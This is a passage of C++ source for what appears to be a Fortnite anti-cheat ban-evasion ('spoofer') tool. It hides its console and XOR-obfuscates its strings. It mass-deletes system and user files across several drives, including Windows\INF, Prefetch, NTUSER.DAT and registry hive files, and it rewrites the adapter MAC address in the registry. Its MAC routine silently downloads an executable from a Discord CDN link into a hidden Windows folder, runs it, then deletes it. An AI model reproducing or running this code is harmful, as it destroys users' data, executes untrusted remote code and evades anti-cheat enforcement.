	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History") );
	system(XorString("rmdir /s /q E:\\Users\\%username%\\Intel") );
	system(XorString("rmdir /s /q E:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData") );
	system(XorString("rmdir /s /q ""\"\E:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache") );
}
void wipe_f() 
{
	HideConsole();
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Roaming\\Microsoft\\Windows\\CloudStore") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\FortniteGame\\Saved") );
	system(XorString("rmdir /s /q F:\\Windows\\INF") );
	system(XorString("rmdir /s /q F:\\ProgramData\\%username%\\Microsoft\\XboxLive\\NSALCache") );
	system(XorString("rmdir /s /q F:\\Users\\Public\\Documents") );
	system(XorString("rmdir /s /q F:\\Windows\\Prefetch") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\D3DSCache") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\CrashReportClient") );
	system(XorString("rmdir /s /q F:\\Windows\\temp") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore") );
	system(XorString("rmdir /s /q F:\\Windows\\SoftwareDistribution\\DataStore\\Logs") );
	system(XorString("rmdir /s /q F:\\ProgramData\\Microsoft\\Windows\\WER\\Temp") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\AMD\\DxCache") );
	system(XorString("rmdir /s /q ""\"\F:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q F:\\Windows\\Prefetch") );
	system(XorString("@del /s /f /a:h / a : a / q F:\\Users\\username%\\AppData\\Local\\Packages\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\*.*") );
	system(XorString("@del /s /f /a:h / a : a / q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\WebCache\\*.*") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\AC") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\LocalCache") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\Settings") );
	system(XorString("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins") );
	system(XorString("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Plugins") );
	system(XorString("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir") );
	system(XorString("rmdir /s /q ""\"\F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Config") );
	system(XorString("rmdir /s /q ""\"\F:\\Users\\%username%\\AppData\\Local\\NVIDIA Corporation") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat") );
	system(XorString("del /f /s /q F:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\NetworksCache") );
	system(XorString("del /f /s /q F:\\ProgramData\\Microsoft\\DataMart\\PaidWiFi\\Rules") );
	system(XorString("rmdir /s /q F:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Microsoft\\Windows\\DeliveryOptimization\\Cache") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Temp") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCookies") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\History") );
	system(XorString("rmdir /s /q F:\\Users\\%username%\\Intel") );
	system(XorString("rmdir /s /q F:\\Windows\\System32\\config\\systemprofile\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\MetaData") );
	system(XorString("rmdir /s /q ""\"\F:\\Users\\%username%\\AppData\\Local\\Microsoft\\Feeds Cache") );
}

//---------------MAC--------------//

MyMACAddr::MyMACAddr()
{
	srand((unsigned)time(0));
}

MyMACAddr::~MyMACAddr()
{
}

string MyMACAddr::GenRandMAC()
{
	stringstream temp;
	int number = 0;
	string result;

	for (int i = 0; i < 6; i++)
	{
		number = rand() % 254;
		temp << setfill('0') << setw(2) << hex << number;
		if (i != 5)
		{
			temp << XorString("-");
		}
	}
	result = temp.str();

	for (auto& c : result)
	{
		c = toupper(c);
	}

	return result;
}

void MyMACAddr::showAdapterList()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	UINT i;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << XorString("Error allocating memory needed to call GetAdaptersinfo.") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << XorString("Error allocating memory needed to call GetAdaptersinfo") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			cout << XorString("\n\tComboIndex: \t") << pAdapter->ComboIndex << endl;
			cout << XorString("\tAdapter Name: \t") << pAdapter->AdapterName << endl;
			cout << XorString("\tAdapter Desc: \t") << pAdapter->Description << endl;
			cout << XorString("\tAdapter Addr: \t");
			for (i = 0; i < pAdapter->AddressLength; i++) {
				if (i == (pAdapter->AddressLength - 1))
					printf(XorString("%.2X\n"), (int)pAdapter->Address[i]);
				else
					printf(XorString("%.2X-"), (int)pAdapter->Address[i]);
			}
			cout << XorString("\tIP Address: \t") << pAdapter->IpAddressList.IpAddress.String << endl;
			cout << XorString("\tIP Mask: \t") << pAdapter->IpAddressList.IpMask.String << endl;
			cout << XorString("\tGateway: \t") << pAdapter->GatewayList.IpAddress.String << endl;
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << XorString("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);
}

unordered_map<string, string> MyMACAddr::getAdapters()
{
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;

	unordered_map<string, string> result;
	stringstream temp;
	string str_mac;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		cerr << XorString("Error allocating memory needed to call GetAdaptersinfo") << endl;
	}

	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO*)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			cerr << XorString("Error allocating memory needed to call GetAdaptersinfo\n") << endl;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			for (UINT i = 0; i < pAdapter->AddressLength; i++) {
				temp << setfill('0') << setw(2) << hex << (int)pAdapter->Address[i];
				if (i != pAdapter->AddressLength - 1)
				{
					temp << "-";
				}
			}
			str_mac = temp.str();
			temp.str("");
			delete temp.rdbuf();
			for (auto& c : str_mac)
			{
				c = toupper(c);
			}

			result.insert({ pAdapter->Description, str_mac });
			pAdapter = pAdapter->Next;
		}
	}
	else {
		cerr << XorString("GetAdaptersInfo failed with error: ") << dwRetVal << endl;
	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);

	return result;
}

void MyMACAddr::AssingRndMAC()
{
	vector <string> list;
	unordered_map<string, string> AdapterDetails = getAdapters();
	for (auto& itm : AdapterDetails)
	{
		list.push_back(itm.first);
	}

	int range = 0;
	for (auto itm = list.begin(); itm != list.end(); itm++)
	{
		cout << '\t' << range + 1 << XorString(")") << *itm << endl;
		range++;
	}

	int selection = 1;
	cout << XorString("\n [>] Adapter is : ") << list.at(selection - 1) << endl;
	cout << XorString(" [-] Old MAC : ") << AdapterDetails.at(list.at(selection - 1)) << endl;

	string wstr(list.at(selection - 1).begin(), list.at(selection - 1).end());
	const char* wAdapterName = wstr.c_str();

	bool bRet = false;
	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T(XorString("SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E972-E325-11CE-BFC1-08002bE10318}")), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		DWORD dwIndex = 0;
		TCHAR Name[1024];
		DWORD cName = 1024;
		while (RegEnumKeyEx(hKey, dwIndex, Name, &cName,
			NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			HKEY hSubKey = NULL;
			if (RegOpenKeyEx(hKey, Name, 0, KEY_ALL_ACCESS, &hSubKey) == ERROR_SUCCESS)
			{
				BYTE Data[1204];
				DWORD cbData = 1024;
				if (RegQueryValueEx(hSubKey, _T(XorString("DriverDesc")), NULL, NULL, Data, &cbData) == ERROR_SUCCESS)
				{

					if (_tcscmp((TCHAR*)Data, wAdapterName) == 0)
					{
						string temp = GenRandMAC();
						string newMAC = temp;
						temp.erase(std::remove(temp.begin(), temp.end(), '-'), temp.end());

						string wstr_newMAC(temp.begin(), temp.end());
						const char* newMACAddr = wstr_newMAC.c_str();

						if (RegSetValueEx(hSubKey, _T(XorString("NetworkAddress")), 0, REG_SZ,
							(const BYTE*)newMACAddr, sizeof(TCHAR) * ((DWORD)_tcslen(newMACAddr) + 1)) == ERROR_SUCCESS)
						{
							cout << " [+] New MAC : " << newMAC << endl;

							printf(XorString("\n [o] Disabling adapter...\n\n"));
							//clean network and restart it
							HRESULT networker = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/882370576570785836/910265474623864862/NetWorker.exe"), _T("C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe"), 0, NULL);
							system("start C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe");
							Sleep(6000);
							printf(XorString(" [x] Enabling adapter...\n"));
							Sleep(6000);
							DeleteFileW(L"C:\\Windows\\IME\\IMEKR\\DICTS\\network.exe");
						}
					}
				}
				RegCloseKey(hSubKey);
			}
			cName = 1024;
			dwIndex++;
		}
		RegCloseKey(hKey);
	}
	else
	{
		return;
	}
}

//---------------CLEAN--------------//

int clean()
{
	HideConsole();
	system(XorString("taskkill /f /im EpicGamesLauncher.exe"));
	system(XorString("taskkill /f /im FortniteClient-Win64-Shipping.exe"));
	system(XorString("taskkill /f /im OneDrive.exe"));
	clean_anticheat();
	if (regedit() == TRUE)
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Local\\Temp"));
	system(XorString("rmdir /s /q %systemdrive%\\Users\\%username%\\AppData\\Roaming\\EasyAntiCheat"));
	system(XorString("taskkill /f /im EpicGamesLauncher.exe"));
	system(XorString("taskkill /f /im FortniteClient-Win64-Shipping.exe"));
	system(XorString("taskkill /f /im OneDrive.exe"));
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str());
	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini:NTV)").c_str()) != 0)
		DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	DeleteFileW((LR"(F:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	DeleteFileW(XorWideString(L"C:\\Windows\\System32\\catroot2\\dberr.txt"));
	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOCK)").c_str());
	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat)").c_str()) != 0)
		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(AppData\Local\Microsoft\Windows\UsrClass.dat)").c_str()) != 0)
			if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\usrclass.dat)").c_str()) != 0)
				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(AppData\Local\Microsoft\Windows\usrclass.dat)").c_str()) != 0)
					if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Vault\UserProfileRoaming\Latest.dat)").c_str()) != 0)
						if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.log1)").c_str()) != 0)
							if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.LOG2)").c_str()) != 0)
								if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.log2.LOG2)").c_str()) != 0)
									if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\UsrClass.dat.log2)").c_str()) != 0)
										if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
											if (DeleteFileW(L"C:\\Users\\Public\\Libraries\\collection.dat") != 0)
												if (DeleteFileW(L"C:$Secure:$SDH:$INDEX_ALLOCATION") != 0)
													if (DeleteFileW(L"C:\$Secure:\$SDH:\$INDEX_ALLOCATION") != 0)
														if (DeleteFileW(L"C:\\Users\\Public\\Shared Files:VersionCache") != 0)
															if (DeleteFileW(L"C:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
																if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\04f992c.tmp)").c_str()) != 0)
																	DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str());
	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
			DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds:KnownSources)").c_str());
	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
		DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds:KnownSources)").c_str());
	if (DeleteFileW(L"C:\\desktop.ini:CachedTiles") != 0)
		if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Config\\NoRedist\\Windows\\ShippableWindowsGameUserSettings.ini") != 0)
			if (DeleteFileW(L"C:\\Recovery\\ntuser.sys") != 0)
				DeleteFileW(XorWideString(L"C:\\desktop.ini"));
	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)
				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\ClientSettings.Sav)").c_str()) != 0)
							if (DeleteFileW(L"C:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									if (DeleteFileW(L"C:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log)").c_str()) != 0)
														if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log)").c_str()) != 0)
															if (DeleteFileW(L"C:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2") != 0)
																if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																	if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																		if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG1)").c_str()) != 0)
																			if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG2)").c_str()) != 0)
																				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat)").c_str()) != 0)
																					if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
																						DeleteFileW(XorWideString(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files"));
	if (DeleteFileW(L"C:\\Users\\Public\\Documents") != 0)
		if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
			if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
				if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
					if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
						if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
							if (DeleteFileW(L"C:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\XSettings.Sav") != 0)
								DeleteFileW(XorWideString(L"C:\\Users\\Public\\Shared Files"));
	if (DeleteFileW(L"C:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
		if (DeleteFileW(L"C:\\System Volume Information\\tracking.log") != 0)
			if (DeleteFileW(L"C:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
				if (DeleteFileW(L"C:\\System Volume Information\\WPSettings.dat") != 0)
					if (DeleteFileW((LR"(C:\Users\)" + GetCurrentUserName() + LR"(\NTUSER.DAT)").c_str()) != 0)
						if (DeleteFileW(L"C:\\ProgramData\\ntuser.pol") != 0)
							if (DeleteFileW(L"C:\\PerfLogs\\collection.dat") != 0)
								if (DeleteFileW(L"C:\\Drivers\\storage.cache") != 0)
									if (DeleteFileW(L"C:\\Intel\\setup.cache") != 0)
										if (DeleteFileW(L"C:\\MSOCache\\Setup.dat") != 0)
											DeleteFileW(XorWideString(L"D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files"));
	DeleteFileW(XorWideString(L"E:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files"));
	DeleteFileW(XorWideString(L"F:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files"));
	DeleteFileW(XorWideString(L"E:\\Users\\Public\\Shared Files"));
	DeleteFileW(XorWideString(L"F:\\Users\\Public\\Shared Files"));
	if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str()) != 0)
		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
			if (DeleteFileW(L"D:\\Users\\Public\\Libraries\\collection.dat") != 0)
				if (DeleteFileW(L"D:\\Users\\Public\\Shared Files:VersionCache") != 0)
					DeleteFileW(XorWideString(L"D:\\Users\\Public\\Shared Files"));
	if (DeleteFileW(L"D:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\0021346.tmp)").c_str()) != 0)
			if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
				if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
					if (DeleteFileW(L"D:\\desktop.ini:CachedTiles") != 0)
						if (DeleteFileW(L"D:\\Recovery\\ntuser.sys") != 0)
							DeleteFileW(XorWideString(L"D:\\desktop.ini"));
	if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\AC\INetCookies\ESE\container.dat)").c_str()) != 0)
		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Packages\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\Settings\settings.dat)").c_str()) != 0)
			if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\UnrealEngine\4.23\Saved\Config\WindowsClient\Manifest.ini)").c_str()) != 0)
				if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\\Config\WindowsClient\GameUserSettings.ini)").c_str()) != 0)
					if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\PersistentDownloadDir\\CMS\\CacheAccess.json") != 0)
						if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved)").c_str()) != 0)
							if (DeleteFileW(L"D:\\Windows\\ServiceState\\EventLog\\Data\\lastalive1.dat") != 0)
								if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\\Microsoft\OneDrive\logs\Common\DeviceHealthSummaryConfiguration.ini)").c_str()) != 0)
									if (DeleteFileW(L"D:\\ProgramData\\Microsoft\\Windows\\AppRepository\\Packages\\InputApp_1000.17763.1.0_neutral_neutral_cw5n1h2txyewy\\ActivationStore.dat") != 0)
										if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Logs\FortniteGame.log)").c_str()) != 0)
											if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\Content.IE5)").c_str()) != 0)
												if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\History.IE5)").c_str()) != 0)
													if (DeleteFileW(L"D:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx") != 0)
														if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\metastore\\edb.log)").c_str()) != 0)
															if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\\Local\\Microsoft\\Windows\\SettingSync\\remotemetastore\\v1\\edb.log)").c_str()) != 0)
																if (DeleteFileW(L"D:\\Windows\\SoftwareDistribution\\PostRebootEventCache.V2") != 0)
																	if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																		if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(ntuser.pol)").c_str()) != 0)
																			if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG1)").c_str()) != 0)
																				if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(ntuser.dat.LOG2)").c_str()) != 0)
																					if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\INetCache\IE\container.dat)").c_str()) != 0)
																						if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\FortniteGame\\Binaries\\Win64\\Shared Files:VersionCache") != 0)
																							if (DeleteFileW(L"D:\\Users\\Public\\Documents") != 0)
																								if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CryptoKeys\\AssetRegistry.bin") != 0)
																									if (DeleteFileW(L"D:\\Program Files\\Epic Games\\Fortnite\\Engine\\Plugins\\Editor\\CurveEditorTools\\AssetRegistry.bin") != 0)
																										if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(Documents\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																											if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Unreal Engine\Engine\Config\UserGameUserSettings.ini)").c_str()) != 0)
																												if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\Cloud\bb360279f89647c982d9bc6ab596c2ee\ClientSettings.Sav)").c_str()) != 0)
																													if (DeleteFileW(L"D:\\Windows\\System32\\restore\\MachineGuid.txt") != 0)
																														if (DeleteFileW(L"D:\\System Volume Information\\tracking.log") != 0)
																															if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\ntuser.ini)").c_str()) != 0)
																																if (DeleteFileW((LR"(D:\Users\)" + GetCurrentUserName() + LR"(\ntuser.pol)").c_str()) != 0)
																																	if (DeleteFileW(L"D:\\PerfLogs\\collection.dat") != 0)
																																		if (DeleteFileW(L"D:\\Drivers\\storage.cache") != 0)
																																			if (DeleteFileW(L"D:\\Intel\\setup.cache") != 0)
																																				if (DeleteFileW(L"D:\\MSOCache\\Setup.dat") != 0)
																																					if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Windows\History\desktop.ini)").c_str()) != 0)
																																						if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\FortniteGame\Saved\LMS\Manifest.sav)").c_str()) != 0)
																																							if (DeleteFileW(L"E:\\Users\\Public\\Libraries\\collection.dat") != 0)
																																								if (DeleteFileW(L"E:\\Users\\Public\\Shared Files:VersionCache") != 0)
																																									if (DeleteFileW(L"E:\\MSOCache\\{71230000-00E2-0000-1000-00000000}\\Setup.dat") != 0)
																																										if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Temp\0021346.tmp)").c_str()) != 0)
																																											if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(Videos\Captures\desktop.ini)").c_str()) != 0)
																																												if (DeleteFileW((LR"(E:\Users\)" + GetCurrentUserName() + LR"(\AppData\Local\Microsoft\Feeds)").c_str()) != 0)
																																													if (DeleteFileW(L"E:\\desktop.ini:CachedTiles") != 0)
